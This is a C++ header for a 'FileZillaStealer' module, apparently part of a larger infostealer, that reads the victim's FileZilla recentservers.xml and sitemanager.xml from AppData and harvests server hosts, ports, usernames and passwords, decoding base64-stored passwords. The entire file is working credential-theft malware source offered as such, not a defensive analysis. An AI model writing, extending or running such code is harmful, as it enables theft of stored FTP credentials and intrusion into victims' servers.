#pragma once


#include "../crypto.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "base.hpp"
#include <pugixml.hpp>

class FileZillaStealer : public AbstractStealer {
public:
    void steal() override {
        wchar_t* appdataPath;
        if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdataPath) != S_OK)
            return;
        std::filesystem::path basePath = std::wstring(appdataPath) + L"\\FileZilla";
        CoTaskMemFree(appdataPath);

        if (!std::filesystem::exists(basePath)) return;

        const char* files[] = { "recentservers.xml", "sitemanager.xml" };
        for (auto filename : files) {
            auto filePath = basePath / filename;
            if (!std::filesystem::exists(filePath)) continue;

            pugi::xml_document doc;
            if (!doc.load_file(filePath.string().c_str())) continue;

            for (auto server = doc.child("FileZilla3").child("RecentServers").child("Server");
                 server; server = server.next_sibling("Server"))
                parse_server(server);

            for (auto server = doc.child("FileZilla3").child("Servers").child("Server");
                 server; server = server.next_sibling("Server"))
                parse_server(server);
        }
    }

private:
    void parse_server(pugi::xml_node& server) {
        Login login;
        auto host = server.child("Host").text().get();
        auto port = server.child("Port").text().get();
        login.website = va("ftp://%s:%s", host, port);
        login.username = server.child("User").text().get();

        std::string encoded = server.child("Pass").text().get();
        std::string encoding = server.child("Pass").attribute("encoding").value();
        if (encoding == "base64") {
            login.password = crypto::base64_decode_str(encoded);
        } else {
            login.password = encoded;
        }

        logins.push_back(std::move(login));
    }
};
